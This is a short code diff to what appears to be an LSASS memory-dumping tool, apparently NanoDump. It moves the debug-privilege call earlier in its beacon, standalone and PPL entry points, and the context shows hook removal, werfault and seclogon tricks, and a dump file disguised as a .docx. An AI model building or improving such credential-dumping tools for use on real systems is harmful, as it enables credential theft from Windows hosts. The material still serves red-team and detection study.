@@ -55,6 +55,10 @@ void go(char* args, int length)
 
     remove_syscall_callback_hook();
 
+    success = enable_debug_priv();
+    if (!success)
+        goto end;
+
     // if not provided, get the PID of LSASS
     if (!lsass_pid)
     {
@@ -91,10 +95,6 @@ void go(char* args, int length)
         if (!create_file(&full_dump_path))
             goto end;
     }
-
-    success = enable_debug_priv();
-    if (!success)
-        goto end;
 
     BOOL use_malseclogon_remotely = use_malseclogon && duplicate_handle;
     BOOL use_malseclogon_locally = use_malseclogon && !duplicate_handle;
@@ -462,6 +462,10 @@ int main(int argc, char* argv[])
 
     remove_syscall_callback_hook();
 
+    success = enable_debug_priv();
+    if (!success)
+        goto end;
+
     // if not provided, get the PID of LSASS
     if (!lsass_pid)
     {
@@ -501,10 +505,6 @@ int main(int argc, char* argv[])
         werfault_silent_process_exit(lsass_pid, werfault_lsass);
         return 0;
     }
-
-    success = enable_debug_priv();
-    if (!success)
-        goto end;
 
     if (use_malseclogon && !malseclogon_target_binary)
         malseclogon_target_binary = argv[0];
@@ -955,6 +955,10 @@ BOOL NanoDumpPPL(VOID)
         goto end;
     }
 
+    success = enable_debug_priv();
+    if (!success)
+        goto end;
+	
     // if not provided, get the PID of LSASS
     if (!lsass_pid)
     {
@@ -972,10 +976,6 @@ BOOL NanoDumpPPL(VOID)
         PRINT("You must provide the dump file: --write C:\\Windows\\Temp\\doc.docx");
         goto end;
     }
-
-    success = enable_debug_priv();
-    if (!success)
-        goto end;
 
     if (!create_file(&full_dump_path))
         goto end;
